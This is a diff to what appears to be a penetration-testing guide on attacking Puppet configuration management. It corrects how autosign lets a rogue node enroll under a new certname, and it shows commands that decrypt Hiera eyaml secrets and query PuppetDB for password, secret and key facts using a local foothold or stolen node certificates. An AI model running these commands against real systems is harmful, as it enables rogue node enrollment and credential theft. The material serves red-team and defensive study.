@@ -37,10 +37,10 @@ Write access to the control repo is estate-wide root execution; see [versioning]
 
 ## Autosign and rogue nodes
 
-If the CA is configured with `autosign = true` (or a weak autosign script), any host that requests a certificate is signed and can pull catalogs and enroll as a managed node. That exposes the environment's data to an attacker-controlled node and, with naming control, lets a rogue node receive another node's catalog and its embedded secrets.
+If the CA is configured with `autosign = true` (or a weak autosign script), any host that requests a certificate for an **unused** name is signed and can enroll as a managed node, pull catalogs, and read the environment data those catalogs carry. Autosign does not issue a second certificate for a name that is already a managed node, so the lever is enrolling a new node, often one named to match a node-group or classification rule so it receives a privileged catalog, not impersonating an existing one:
 
 ```bash
-puppet agent --test --server <puppetserver> --certname spoofed.corp.local   # enroll if autosign is on
+puppet agent --test --server <puppetserver> --certname attacker-node.corp.local   # enroll a NEW name if autosign is on
 ```
 
 ## Loot Hiera and PuppetDB
@@ -53,11 +53,13 @@ find /etc/puppetlabs -name '*.eyaml' -o -name 'hiera.yaml'
 eyaml decrypt -f secrets.eyaml --pkcs7-private-key /etc/puppetlabs/puppet/keys/private_key.pkcs7.pem
 ```
 
-PuppetDB stores every node's facts, catalogs, and reports and exposes a query API that is frequently reachable without authentication inside the network. It is a reconnaissance goldmine: facts often carry secrets, and exported resources map trust relationships across the estate.
+PuppetDB stores every node's facts, catalogs, and reports and exposes a query API. It is a reconnaissance goldmine: facts often carry secrets, and exported resources map trust relationships across the estate. PuppetDB listens with TLS and certificate authentication on 8081 and with plaintext HTTP only on the loopback port 8080, so query it from a foothold on the PuppetDB host over 8080, or over 8081 with a client certificate taken from a Puppet node:
 
 ```bash
-curl -s 'http://<puppetdb>:8081/pdb/query/v4/facts' | jq '.[] | select(.name|test("password|secret|key";"i"))'
-curl -s 'http://<puppetdb>:8081/pdb/query/v4/nodes' | jq '.[].certname'
+# from a foothold on the PuppetDB host (local plaintext port)
+curl -s 'http://localhost:8080/pdb/query/v4/facts' | jq '.[] | select(.name|test("password|secret|key";"i"))'
+# remotely, with a node's client cert and key for the TLS listener
+curl -s --cert node.pem --key node.key 'https://<puppetdb>:8081/pdb/query/v4/nodes' | jq '.[].certname'
 ```
 
 ## Follow-on
